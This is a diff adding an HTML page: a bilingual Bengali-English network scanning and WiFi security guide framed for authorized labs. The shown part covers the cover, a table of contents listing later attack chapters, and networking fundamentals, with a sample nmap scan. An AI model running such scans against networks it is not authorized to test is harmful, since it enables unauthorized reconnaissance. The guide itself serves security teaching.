@@ -1,0 +1,1361 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Scanning & WiFi Security — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #f0f4ff;
+  --surface: #ffffff;
+  --surface2: #e8edf8;
+  --border: #c8d2e8;
+  --accent: #2563eb;
+  --accent2: #059669;
+  --accent3: #dc2626;
+  --accent4: #7c3aed;
+  --accent5: #d97706;
+  --text: #1e2a3a;
+  --text-dim: #64748b;
+  --text-bright: #0f172a;
+  --code-bg: #0f1117;
+  --code-text: #e2e8f0;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Hind Siliguri', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.9;
+}
+
+/* ══ BILINGUAL ══ */
+.en-text { display:none; }
+.bn-text { display:inline; }
+body.lang-en .bn-text { display:none; }
+body.lang-en .en-text { display:inline; }
+.en-block { display:none; }
+.bn-block { display:block; }
+body.lang-en .bn-block { display:none; }
+body.lang-en .en-block { display:block; }
+
+/* ══ DARK MODE ══ */
+body.dark-mode {
+  --bg: #080c14;
+  --surface: #0e1520;
+  --surface2: #141c2c;
+  --border: #1e2d45;
+  --text: #c5d0e0;
+  --text-dim: #5a7090;
+  --text-bright: #e8f0ff;
+  --code-bg: #050810;
+  --accent: #60a5fa;
+  --accent2: #34d399;
+  --accent3: #f87171;
+  --accent4: #a78bfa;
+  --accent5: #fbbf24;
+}
+body.dark-mode .card { background: var(--surface2); }
+body.dark-mode tr:nth-child(even) { background: rgba(255,255,255,0.02); }
+body.dark-mode .info   { background: rgba(96,165,250,0.07); }
+body.dark-mode .warn   { background: rgba(251,191,36,0.07); }
+body.dark-mode .danger { background: rgba(248,113,113,0.07); }
+body.dark-mode .success{ background: rgba(52,211,153,0.07); }
+
+/* ══ TOP CONTROLS ══ */
+.top-controls { position:fixed; top:16px; right:16px; display:flex; gap:8px; z-index:9999; }
+.ctrl-btn {
+  padding:8px 16px; border-radius:6px; font-size:13px;
+  font-family:'Outfit',sans-serif; cursor:pointer; font-weight:700;
+  letter-spacing:0.3px; transition:all 0.2s; border:1.5px solid; background:transparent;
+}
+.print-btn { border-color:var(--accent3); color:var(--accent3); }
+.print-btn:hover { background:var(--accent3); color:#fff; }
+.theme-btn { border-color:var(--accent5); color:var(--accent5); }
+.theme-btn:hover { background:var(--accent5); color:#fff; }
+.lang-btn  { border-color:var(--accent);  color:var(--accent); }
+.lang-btn:hover  { background:var(--accent); color:#fff; }
+
+/* ══ COVER ══ */
+.cover {
+  min-height:100vh;
+  background: linear-gradient(150deg, #040a18 0%, #071428 35%, #0a1838 60%, #060d1e 100%);
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  text-align:center; padding:80px 40px; page-break-after:always; position:relative; overflow:hidden;
+}
+.cover-waves {
+  position:absolute; inset:0; overflow:hidden; opacity:0.04;
+  background: repeating-radial-gradient(circle at 50% 50%, transparent 0, transparent 40px, rgba(37,99,235,1) 41px);
+}
+.cover-pulse {
+  position:absolute; width:500px; height:500px; border-radius:50%;
+  top:50%; left:50%; transform:translate(-50%,-50%);
+  border:1px solid rgba(37,99,235,0.15);
+  box-shadow: 0 0 0 60px rgba(37,99,235,0.04), 0 0 0 120px rgba(37,99,235,0.03), 0 0 0 200px rgba(37,99,235,0.02);
+}
+.cover-icon { font-size:72px; position:relative; margin-bottom:16px; filter:drop-shadow(0 0 25px rgba(37,99,235,0.5)); }
+.cover-tag-line {
+  font-family:'Space Mono',monospace; font-size:11px; letter-spacing:5px;
+  color:rgba(96,165,250,0.7); text-transform:uppercase; margin-bottom:20px;
+  position:relative; border:1px solid rgba(96,165,250,0.2); padding:5px 18px; border-radius:2px;
+}
+.cover h1 {
+  font-family:'Outfit',sans-serif; font-size:50px; font-weight:800;
+  color:#e8f0ff; line-height:1.05; position:relative; letter-spacing:-1px; margin-bottom:6px;
+}
+.cover h1 .hi { color:#60a5fa; }
+.cover h2 {
+  font-family:'Outfit',sans-serif; font-size:22px; font-weight:500;
+  color:rgba(160,185,220,0.5); margin-bottom:28px; position:relative;
+}
+.cover-bar { width:50px; height:3px; background:var(--accent); margin:0 auto 28px; position:relative; }
+.cover-desc {
+  font-size:14.5px; color:rgba(150,180,215,0.55); max-width:620px;
+  line-height:2.1; margin-bottom:34px; position:relative;
+}
+.cover-term {
+  background:rgba(0,0,0,0.5); border:1px solid rgba(37,99,235,0.2);
+  border-top:3px solid var(--accent); border-radius:6px; padding:18px 26px;
+  font-family:'Space Mono',monospace; font-size:12px; text-align:left;
+  max-width:500px; width:100%; margin-bottom:28px; position:relative;
+}
+.term-p { color:#60a5fa; }
+.term-c { color:#34d399; }
+.term-o { color:#94a3b8; font-size:11.5px; }
+.cover-pills { display:flex; flex-wrap:wrap; gap:7px; justify-content:center; position:relative; }
+.cpill { font-family:'Space Mono',monospace; font-size:11px; padding:4px 12px; border-radius:2px; border:1px solid; }
+.cp-b { color:#60a5fa; border-color:rgba(96,165,250,0.3);  background:rgba(96,165,250,0.07); }
+.cp-g { color:#34d399; border-color:rgba(52,211,153,0.3);  background:rgba(52,211,153,0.07); }
+.cp-r { color:#f87171; border-color:rgba(248,113,113,0.3); background:rgba(248,113,113,0.07); }
+.cp-p { color:#a78bfa; border-color:rgba(167,139,250,0.3); background:rgba(167,139,250,0.07); }
+.cp-y { color:#fbbf24; border-color:rgba(251,191,36,0.3);  background:rgba(251,191,36,0.07); }
+
+/* ══ TOC ══ */
+.toc { background:var(--surface); padding:55px 65px; page-break-after:always; border-top:4px solid var(--accent); }
+.toc-h { font-family:'Outfit',sans-serif; font-size:26px; font-weight:800; color:var(--accent); margin-bottom:5px; }
+.toc-sh { font-family:'Space Mono',monospace; font-size:10px; color:var(--text-dim); letter-spacing:3px; text-transform:uppercase; margin-bottom:32px; }
+.toc-row { display:flex; align-items:flex-start; gap:14px; padding:11px 0; border-bottom:1px solid var(--border); transition:padding-left 0.2s; }
+.toc-row:hover { padding-left:6px; }
+.toc-n { font-family:'Space Mono',monospace; font-size:11px; color:var(--accent); min-width:28px; padding-top:2px; }
+.toc-info { flex:1; }
+.toc-name { font-family:'Outfit',sans-serif; font-size:15px; font-weight:700; color:var(--text-bright); }
+.toc-sub { font-size:12px; color:var(--text-dim); margin-top:2px; }
+.toc-tag { font-family:'Space Mono',monospace; font-size:10px; padding:2px 8px; border-radius:2px; white-space:nowrap; align-self:center; border:1px solid; }
+
+/* ══ CHAPTERS ══ */
+.chapter { background:var(--surface); page-break-before:always; }
+.chapter-header { padding:45px 60px; position:relative; overflow:hidden; }
+.ch1  .chapter-header { background:linear-gradient(135deg,#030812,#061428); border-top:4px solid #2563eb; }
+.ch2  .chapter-header { background:linear-gradient(135deg,#021208,#041e10); border-top:4px solid #059669; }
+.ch3  .chapter-header { background:linear-gradient(135deg,#120308,#1e0610); border-top:4px solid #dc2626; }
+.ch4  .chapter-header { background:linear-gradient(135deg,#080312,#10061e); border-top:4px solid #7c3aed; }
+.ch5  .chapter-header { background:linear-gradient(135deg,#120800,#1e1000); border-top:4px solid #d97706; }
+.ch6  .chapter-header { background:linear-gradient(135deg,#030812,#061830); border-top:4px solid #2563eb; }
+.ch7  .chapter-header { background:linear-gradient(135deg,#021208,#042018); border-top:4px solid #059669; }
+.ch8  .chapter-header { background:linear-gradient(135deg,#120208,#200310); border-top:4px solid #dc2626; }
+.ch9  .chapter-header { background:linear-gradient(135deg,#080212,#10041e); border-top:4px solid #7c3aed; }
+.ch10 .chapter-header { background:linear-gradient(135deg,#120600,#1e0e00); border-top:4px solid #d97706; }
+.ch11 .chapter-header { background:linear-gradient(135deg,#021208,#041a10); border-top:4px solid #059669; }
+.ch12 .chapter-header { background:linear-gradient(135deg,#030812,#061428); border-top:4px solid #2563eb; }
+
+.chapter-header::after {
+  content:attr(data-num); position:absolute; right:55px; top:50%; transform:translateY(-50%);
+  font-family:'Outfit',sans-serif; font-size:110px; font-weight:800; opacity:0.05; color:white; line-height:1;
+}
+.ch-label { font-family:'Space Mono',monospace; font-size:10px; letter-spacing:4px; color:rgba(255,255,255,0.3); text-transform:uppercase; margin-bottom:10px; }
+.ch-title { font-family:'Outfit',sans-serif; font-size:30px; color:#e8f0ff; font-weight:800; letter-spacing:-0.5px; line-height:1.2; }
+.ch-desc { font-size:13px; color:rgba(180,205,230,0.45); margin-top:8px; }
+.chapter-body { padding:45px 60px; }
+
+/* ══ HEADINGS ══ */
+h2.sec {
+  font-family:'Outfit',sans-serif; font-size:19px; font-weight:800;
+  color:var(--accent); margin:36px 0 14px;
+  padding-left:14px; border-left:3px solid var(--accent);
+}
+.ch2 h2.sec  { color:var(--accent2); border-left-color:var(--accent2); }
+.ch3 h2.sec  { color:var(--accent3); border-left-color:var(--accent3); }
+.ch4 h2.sec  { color:var(--accent4); border-left-color:var(--accent4); }
+.ch5 h2.sec  { color:var(--accent5); border-left-color:var(--accent5); }
+.ch6 h2.sec  { color:var(--accent);  border-left-color:var(--accent); }
+.ch7 h2.sec  { color:var(--accent2); border-left-color:var(--accent2); }
+.ch8 h2.sec  { color:var(--accent3); border-left-color:var(--accent3); }
+.ch9 h2.sec  { color:var(--accent4); border-left-color:var(--accent4); }
+.ch10 h2.sec { color:var(--accent5); border-left-color:var(--accent5); }
+.ch11 h2.sec { color:var(--accent2); border-left-color:var(--accent2); }
+.ch12 h2.sec { color:var(--accent);  border-left-color:var(--accent); }
+
+h3.sub { font-family:'Outfit',sans-serif; font-size:15px; font-weight:700; color:var(--text-bright); margin:22px 0 10px; padding-bottom:5px; border-bottom:1px solid var(--border); }
+p { margin-bottom:14px; text-align:justify; }
+
+/* ══ CODE ══ */
+.code {
+  background:var(--code-bg); color:var(--code-text);
+  padding:18px 22px; border-radius:6px; font-family:'Space Mono',monospace;
+  font-size:12px; margin:15px 0; line-height:1.9;
+  overflow-x:auto; border:1px solid rgba(255,255,255,0.05);
+  border-left:3px solid var(--accent);
+}
+.ch2 .code { border-left-color:var(--accent2); }
+.ch3 .code { border-left-color:var(--accent3); }
+.ch4 .code { border-left-color:var(--accent4); }
+.ch5 .code { border-left-color:var(--accent5); }
+.ch7 .code { border-left-color:var(--accent2); }
+.ch8 .code { border-left-color:var(--accent3); }
+.ch9 .code { border-left-color:var(--accent4); }
+.ch10 .code{ border-left-color:var(--accent5); }
+.ch11 .code{ border-left-color:var(--accent2); }
+.ch12 .code{ border-left-color:var(--accent); }
+
+.code .c  { color:#475569; font-style:italic; }
+.code .k  { color:#f472b6; }
+.code .s  { color:#86efac; }
+.code .n  { color:#fcd34d; }
+.code .f  { color:#7dd3fc; }
+.code .g  { color:#34d399; }
+.code .r  { color:#f87171; }
+.code .p  { color:#60a5fa; }
+.code .b  { color:#7dd3fc; }
+code {
+  background:rgba(0,0,0,0.08); color:var(--accent);
+  padding:2px 7px; border-radius:3px;
+  font-family:'Space Mono',monospace; font-size:12px;
+}
+body.dark-mode code { background:rgba(255,255,255,0.08); }
+
+/* ══ BOXES ══ */
+.box { padding:15px 20px; border-radius:6px; margin:16px 0; border-left:4px solid; }
+.info    { background:rgba(37,99,235,0.07);  border-color:var(--accent); }
+.warn    { background:rgba(217,119,6,0.07);  border-color:var(--accent5); }
+.danger  { background:rgba(220,38,38,0.07);  border-color:var(--accent3); }
+.success { background:rgba(5,150,105,0.07);  border-color:var(--accent2); }
+.box-t { font-family:'Outfit',sans-serif; font-weight:700; font-size:13px; margin-bottom:7px; }
+.box p,.box li { color:var(--text); }
+
+/* ══ TABLES ══ */
+table { width:100%; border-collapse:collapse; margin:16px 0; font-size:13px; }
+thead tr { background:var(--code-bg); color:#e2e8f0; }
+th { padding:10px 14px; text-align:left; font-weight:700; color:#7dd3fc; border-bottom:1px solid var(--border); font-family:'Outfit',sans-serif; font-size:12px; letter-spacing:0.3px; }
+td { padding:9px 14px; border-bottom:1px solid var(--border); color:var(--text); }
+tr:nth-child(even) { background:rgba(0,0,0,0.02); }
+tr:hover { background:rgba(37,99,235,0.04); }
+
+/* ══ GRID ══ */
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin:16px 0; }
+.grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; margin:14px 0; }
+.card { background:var(--surface2); border:1px solid var(--border); border-radius:6px; padding:16px; }
+.card h4 { font-family:'Outfit',sans-serif; font-size:13px; font-weight:700; margin-bottom:9px; padding-bottom:6px; border-bottom:1px solid var(--border); }
+.card.b-card  { border-color:rgba(37,99,235,0.3);  } .card.b-card  h4 { color:var(--accent); }
+.card.g-card  { border-color:rgba(5,150,105,0.3);  } .card.g-card  h4 { color:var(--accent2); }
+.card.r-card  { border-color:rgba(220,38,38,0.3);  } .card.r-card  h4 { color:var(--accent3); }
+.card.p-card  { border-color:rgba(124,58,237,0.3); } .card.p-card  h4 { color:var(--accent4); }
+.card.y-card  { border-color:rgba(217,119,6,0.3);  } .card.y-card  h4 { color:var(--accent5); }
+
+/* ══ BADGE ══ */
+.badge { display:inline-block; padding:2px 8px; border-radius:3px; font-size:11px; font-weight:700; margin:1px; font-family:'Outfit',sans-serif; border:1px solid; }
+.badge-b { background:rgba(37,99,235,0.1);  color:var(--accent);  border-color:rgba(37,99,235,0.25); }
+.badge-g { background:rgba(5,150,105,0.1);  color:var(--accent2); border-color:rgba(5,150,105,0.25); }
+.badge-r { background:rgba(220,38,38,0.1);  color:var(--accent3); border-color:rgba(220,38,38,0.25); }
+.badge-p { background:rgba(124,58,237,0.1); color:var(--accent4); border-color:rgba(124,58,237,0.25); }
+.badge-y { background:rgba(217,119,6,0.1);  color:var(--accent5); border-color:rgba(217,119,6,0.25); }
+
+ul,ol { margin:10px 0 10px 22px; line-height:2; }
+li { margin-bottom:2px; }
+
+/* ══ NETWORK DIAGRAM ══ */
+.netdiag {
+  background:var(--code-bg); border:1px solid rgba(37,99,235,0.2);
+  border-radius:6px; padding:20px 24px; margin:16px 0;
+  font-family:'Space Mono',monospace; font-size:12px; line-height:1.9;
+  overflow-x:auto; color:#e2e8f0;
+}
+.nd-b { color:#60a5fa; }
+.nd-g { color:#34d399; }
+.nd-r { color:#f87171; }
+.nd-y { color:#fcd34d; }
+.nd-p { color:#a78bfa; }
+.nd-w { color:#94a3b8; }
+
+/* ══ CHEAT SHEET ══ */
+.cheat-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin:16px 0; }
+.cheat-card { background:var(--surface2); border:1px solid var(--border); border-radius:6px; overflow:hidden; }
+.cheat-head { padding:8px 14px; font-family:'Outfit',sans-serif; font-size:12px; font-weight:800; letter-spacing:0.3px; }
+.cheat-row { display:flex; padding:5px 12px; border-bottom:1px solid var(--border); font-size:11.5px; gap:10px; }
+.cheat-row:last-child { border-bottom:none; }
+.cheat-cmd { font-family:'Space Mono',monospace; color:var(--accent2); min-width:185px; white-space:nowrap; font-size:11px; }
+.cheat-desc { color:var(--text-dim); }
+
+/* ══ SUMMARY ══ */
+.ch-summary { background:var(--code-bg); border-radius:6px; padding:22px 26px; margin-top:38px; border-top:3px solid var(--accent); }
+.ch2  .ch-summary { border-top-color:var(--accent2); }
+.ch3  .ch-summary { border-top-color:var(--accent3); }
+.ch4  .ch-summary { border-top-color:var(--accent4); }
+.ch5  .ch-summary { border-top-color:var(--accent5); }
+.ch-summary h3 { font-family:'Outfit',sans-serif; font-size:14px; font-weight:800; color:#e8f0ff; margin-bottom:12px; }
+.ch-summary li { color:#94a3b8; }
+
+@media (max-width:768px) {
+  .grid2,.grid3,.cheat-grid { grid-template-columns:1fr; }
+  .chapter-body,.chapter-header { padding:25px 20px; }
+  .toc { padding:30px 20px; }
+}
+@media print {
+  .top-controls { display:none; }
+  .chapter-header { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+  .code,.netdiag { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()"  id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-waves"></div>
+  <div class="cover-pulse"></div>
+  <div class="cover-icon">📡</div>
+  <div class="cover-tag-line">// Cyber Security Series — Network //</div>
+  <h1><span class="hi">Network Scanning</span></h1>
+  <h1 style="font-size:36px; color:rgba(180,210,240,0.45); font-weight:600; margin-top:4px;">
+    &amp; <span style="color:#e8f0ff;">WiFi Security</span>
+  </h1>
+  <h2><span class="bn-text">সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Complete Guide</span></h2>
+  <div class="cover-bar"></div>
+  <p class="cover-desc">
+    <span class="bn-text">Network কীভাবে কাজ করে সেটা বোঝা থেকে শুরু করে — Nmap দিয়ে professional scanning, Wireshark দিয়ে packet analysis, এবং WiFi security assessment (WPA2, WPS vulnerabilities) — সব কিছু authorized lab environment-এর জন্য।</span>
+    <span class="en-text">From understanding how networks work — professional scanning with Nmap, packet analysis with Wireshark, and WiFi security assessment (WPA2, WPS vulnerabilities) — everything for authorized lab environments.</span>
+  </p>
+  <div class="cover-term">
+    <div style="display:flex;gap:7px;margin-bottom:12px;">
+      <span style="width:10px;height:10px;border-radius:50%;background:#ff5f56;display:inline-block;"></span>
+      <span style="width:10px;height:10px;border-radius:50%;background:#ffbd2e;display:inline-block;"></span>
+      <span style="width:10px;height:10px;border-radius:50%;background:#27c93f;display:inline-block;"></span>
+    </div>
+    <div><span class="term-p">root@kali</span>:~# <span class="term-c">nmap -sV -A 192.168.1.0/24</span></div>
+    <div class="term-o">Starting Nmap 7.94 ( https://nmap.org )</div>
+    <div class="term-o">Nmap scan report for 192.168.1.1</div>
+    <div class="term-o">PORT   STATE SERVICE VERSION</div>
+    <div class="term-o" style="color:#34d399;">22/tcp open  ssh     OpenSSH 8.2</div>
+    <div class="term-o" style="color:#34d399;">80/tcp open  http    Apache 2.4.41</div>
+  </div>
+  <div class="cover-pills">
+    <span class="cpill cp-b">🌐 TCP/IP Basics</span>
+    <span class="cpill cp-g">🔍 Nmap Mastery</span>
+    <span class="cpill cp-r">📦 Packet Analysis</span>
+    <span class="cpill cp-p">🦈 Wireshark</span>
+    <span class="cpill cp-y">📡 WiFi Protocols</span>
+    <span class="cpill cp-b">🔒 WPA2 Security</span>
+    <span class="cpill cp-g">⚡ Aircrack-ng Suite</span>
+    <span class="cpill cp-r">🛡️ WiFi Defense</span>
+    <span class="cpill cp-p">📋 Cheat Sheet</span>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-h">// <span class="bn-text">বিষয়সূচি</span><span class="en-text">Table of Contents</span> //</div>
+  <div class="toc-sh">Network Scanning &amp; WiFi Security — Complete Guide</div>
+
+  <div class="toc-row"><span class="toc-n">01</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Network Fundamentals</span><span class="en-text">Network Fundamentals</span></div><div class="toc-sub">TCP/IP, OSI Model, IP/MAC, Ports, Protocols — <span class="bn-text">মূল ধারণা</span><span class="en-text">core concepts</span></div></div><span class="toc-tag badge-b">THEORY</span></div>
+
+  <div class="toc-row"><span class="toc-n">02</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Network Discovery</span><span class="en-text">Network Discovery</span></div><div class="toc-sub">ping, arp-scan, netdiscover — <span class="bn-text">live hosts খোঁজা</span><span class="en-text">finding live hosts</span></div></div><span class="toc-tag badge-g">DISCOVER</span></div>
+
+  <div class="toc-row"><span class="toc-n">03</span><div class="toc-info"><div class="toc-name">Nmap — <span class="bn-text">সম্পূর্ণ গাইড</span><span class="en-text">Complete Guide</span></div><div class="toc-sub"><span class="bn-text">Scan types, NSE scripts, OS detection, output — সব কিছু</span><span class="en-text">Scan types, NSE scripts, OS detection, output — everything</span></div></div><span class="toc-tag badge-r">NMAP</span></div>
+
+  <div class="toc-row"><span class="toc-n">04</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Packet Capture ও Analysis</span><span class="en-text">Packet Capture & Analysis</span></div><div class="toc-sub">tcpdump, Wireshark — <span class="bn-text">network traffic পড়া ও বিশ্লেষণ</span><span class="en-text">reading and analyzing network traffic</span></div></div><span class="toc-tag badge-p">PACKETS</span></div>
+
+  <div class="toc-row"><span class="toc-n">05</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Service Enumeration</span><span class="en-text">Service Enumeration</span></div><div class="toc-sub">SMB, FTP, SSH, HTTP, SNMP — <span class="bn-text">service থেকে তথ্য বের করা</span><span class="en-text">extracting information from services</span></div></div><span class="toc-tag badge-y">ENUM</span></div>
+
+  <div class="toc-row"><span class="toc-n">06</span><div class="toc-info"><div class="toc-name"><span class="bn-text">WiFi Protocol ও Security</span><span class="en-text">WiFi Protocol & Security</span></div><div class="toc-sub">802.11, WEP, WPA, WPA2, WPA3 — <span class="bn-text">কীভাবে কাজ করে</span><span class="en-text">how they work</span></div></div><span class="toc-tag badge-b">WIFI</span></div>
+
+  <div class="toc-row"><span class="toc-n">07</span><div class="toc-info"><div class="toc-name"><span class="bn-text">WiFi Reconnaissance</span><span class="en-text">WiFi Reconnaissance</span></div><div class="toc-sub">Monitor mode, airodump-ng, kismet — <span class="bn-text">wireless network scanning</span><span class="en-text">wireless network scanning</span></div></div><span class="toc-tag badge-g">RECON</span></div>
+
+  <div class="toc-row"><span class="toc-n">08</span><div class="toc-info"><div class="toc-name"><span class="bn-text">WPA2 Handshake Capture ও Crack</span><span class="en-text">WPA2 Handshake Capture & Crack</span></div><div class="toc-sub">aircrack-ng, hashcat — <span class="bn-text">নিজের network test করা</span><span class="en-text">testing your own network</span></div></div><span class="toc-tag badge-r">WPA2</span></div>
+
+  <div class="toc-row"><span class="toc-n">09</span><div class="toc-info"><div class="toc-name"><span class="bn-text">WPS ও অন্যান্য WiFi Vulnerabilities</span><span class="en-text">WPS & Other WiFi Vulnerabilities</span></div><div class="toc-sub">Reaver, Bully, PMKID attack, Evil Twin — <span class="bn-text">পরিচিতি</span><span class="en-text">introduction</span></div></div><span class="toc-tag badge-p">VULN</span></div>
+
+  <div class="toc-row"><span class="toc-n">10</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Network Attack Techniques</span><span class="en-text">Network Attack Techniques</span></div><div class="toc-sub">ARP Spoofing, DNS Spoofing, MITM — <span class="bn-text">কীভাবে কাজ করে</span><span class="en-text">how they work</span></div></div><span class="toc-tag badge-y">ATTACKS</span></div>
+
+  <div class="toc-row"><span class="toc-n">11</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Network ও WiFi Defense</span><span class="en-text">Network & WiFi Defense</span></div><div class="toc-sub"><span class="bn-text">নিজের নেটওয়ার্ক সুরক্ষিত করার সম্পূর্ণ গাইড</span><span class="en-text">Complete guide to securing your network</span></div></div><span class="toc-tag badge-g">DEFENSE</span></div>
+
+  <div class="toc-row"><span class="toc-n">12</span><div class="toc-info"><div class="toc-name"><span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div><div class="toc-sub">Nmap, tcpdump, aircrack-ng, Wireshark filters — <span class="bn-text">সব কমান্ড</span><span class="en-text">all commands</span></div></div><span class="toc-tag badge-b">CHEAT</span></div>
+</div>
+
+<!-- CH 1: NETWORK FUNDAMENTALS -->
+<div class="chapter ch1">
+  <div class="chapter-header" data-num="01">
+    <div class="ch-label">CHAPTER 01</div>
+    <div class="ch-title">🌐 <span class="bn-text">Network Fundamentals</span><span class="en-text">Network Fundamentals</span></div>
+    <div class="ch-desc"><span class="bn-text">TCP/IP, OSI Model, IP address, Ports — scanning বোঝার আগে network বুঝতে হবে</span><span class="en-text">TCP/IP, OSI Model, IP address, Ports — must understand networking before scanning</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">OSI Model — ৭ Layer</span><span class="en-text">OSI Model — 7 Layers</span></h2>
+    <table>
+      <thead><tr><th>Layer</th><th><span class="bn-text">নাম</span><span class="en-text">Name</span></th><th>Protocol</th><th><span class="bn-text">Hacking Relevance</span><span class="en-text">Hacking Relevance</span></th></tr></thead>
+      <tbody>
+        <tr><td>7</td><td>Application</td><td>HTTP, FTP, DNS, SSH</td><td><span class="badge badge-r">Web attacks, SQLi, XSS</span></td></tr>
+        <tr><td>6</td><td>Presentation</td><td>SSL/TLS, JPEG, ASCII</td><td><span class="badge badge-y">SSL stripping</span></td></tr>
+        <tr><td>5</td><td>Session</td><td>NetBIOS, RPC</td><td><span class="badge badge-y">Session hijacking</span></td></tr>
+        <tr><td>4</td><td>Transport</td><td>TCP, UDP</td><td><span class="badge badge-r">Port scanning, DoS</span></td></tr>
+        <tr><td>3</td><td>Network</td><td>IP, ICMP, OSPF</td><td><span class="badge badge-r">IP spoofing, routing</span></td></tr>
+        <tr><td>2</td><td>Data Link</td><td>Ethernet, ARP, MAC</td><td><span class="badge badge-r">ARP spoofing, MITM</span></td></tr>
+        <tr><td>1</td><td>Physical</td><td>Cable, WiFi, Fiber</td><td><span class="badge badge-b">Physical tap, WiFi attack</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">TCP vs UDP</span><span class="en-text">TCP vs UDP</span></h2>
+    <div class="grid2">
+      <div class="card b-card">
+        <h4>TCP — <span class="bn-text">নির্ভরযোগ্য</span><span class="en-text">Reliable</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">3-way handshake (SYN → SYN-ACK → ACK) করে connection establish করে। প্রতিটা packet-এর delivery নিশ্চিত করে। HTTP, SSH, FTP ব্যবহার করে।</span><span class="en-text">Establishes connection via 3-way handshake (SYN → SYN-ACK → ACK). Guarantees delivery of every packet. Used by HTTP, SSH, FTP.</span></p>
+        <div class="netdiag" style="margin-top:8px; font-size:11px; padding:10px 14px;">
+Client <span class="nd-b">──SYN──►</span> Server
+Client <span class="nd-g">◄─SYN-ACK─</span> Server
+Client <span class="nd-b">──ACK──►</span> Server
+<span class="nd-g">Connection Established!</span>
+        </div>
+      </div>
+      <div class="card r-card">
+        <h4>UDP — <span class="bn-text">দ্রুত কিন্তু অনির্ভরযোগ্য</span><span class="en-text">Fast but Unreliable</span></h4>
+        <p style="font-size:12.5px;"><span class="bn-text">Handshake নেই — সরাসরি পাঠিয়ে দেয়। Packet হারিয়ে গেলে জানে না। DNS, DHCP, Video streaming ব্যবহার করে।</span><span class="en-text">No handshake — sends directly. Doesn't know if packets are lost. Used by DNS, DHCP, video streaming.</span></p>
+        <div class="netdiag" style="margin-top:8px; font-size:11px; padding:10px 14px;">
+Client <span class="nd-y">──DATA──►</span> Server
+Client <span class="nd-y">──DATA──►</span> Server
+<span class="nd-w">(No acknowledgment)</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">IP Addressing ও Subnetting</span><span class="en-text">IP Addressing & Subnetting</span></h2>
+    <div class="code">
+<span class="c"># IP Address Classes</span>
+<span class="g">Class A:</span> 1.0.0.0   – 126.255.255.255   (<span class="n">Large networks</span>)
+<span class="g">Class B:</span> 128.0.0.0 – 191.255.255.255   (<span class="n">Medium networks</span>)
+<span class="g">Class C:</span> 192.0.0.0 – 223.255.255.255   (<span class="n">Small networks</span>)
+
+<span class="c"># Private IP ranges (LAN এ থাকে)</span>
+10.0.0.0     – 10.255.255.255   (10.0.0.0/8)
+172.16.0.0   – 172.31.255.255   (172.16.0.0/12)
+192.168.0.0  – 192.168.255.255  (192.168.0.0/16)
+
+<span class="c"># CIDR Notation</span>
+192.168.1.0/24  → 256 IPs   (192.168.1.0 – 192.168.1.255)
+192.168.1.0/25  → 128 IPs
+10.0.0.0/8      → 16M+ IPs
+
+<span class="c"># Network info বের করা</span>
+<span class="p">$</span> ip addr show            <span class="c"># Linux IP info</span>
+<span class="p">$</span> ip route                <span class="c"># Routing table</span>
+<span class="p">$</span> cat /etc/resolv.conf    <span class="c"># DNS servers</span>
+<span class="p">$</span> arp -n                  <span class="c"># ARP table</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">গুরুত্বপূর্ণ Ports মনে রাখা</span><span class="en-text">Remembering Important Ports</span></h2>
+    <div class="grid3">
+      <div class="card b-card">
+        <h4><span class="bn-text">সাধারণ Services</span><span class="en-text">Common Services</span></h4>
+        <ul style="font-size:12px; font-family:'Space Mono',monospace;">
+          <li>21  → FTP</li>
+          <li>22  → SSH</li>
+          <li>23  → Telnet</li>
+          <li>25  → SMTP</li>
+          <li>53  → DNS</li>
+          <li>80  → HTTP</li>
+          <li>443 → HTTPS</li>
+        </ul>
+      </div>
+      <div class="card g-card">
+        <h4><span class="bn-text">Database Services</span><span class="en-text">Database Services</span></h4>
+        <ul style="font-size:12px; font-family:'Space Mono',monospace;">
+          <li>1433 → MSSQL</li>
+          <li>1521 → Oracle</li>
+          <li>3306 → MySQL</li>
+          <li>5432 → PostgreSQL</li>
+          <li>6379 → Redis</li>
+          <li>27017→ MongoDB</li>
+        </ul>
+      </div>
+      <div class="card r-card">
+        <h4>Windows/AD</h4>
+        <ul style="font-size:12px; font-family:'Space Mono',monospace;">
+          <li>88  → Kerberos</li>
+          <li>135 → RPC</li>
+          <li>139 → NetBIOS</li>
+          <li>389 → LDAP</li>
+          <li>445 → SMB</li>
+          <li>3389→ RDP</li>
+          <li>5985→ WinRM</li>
+        </ul>
+      </div>
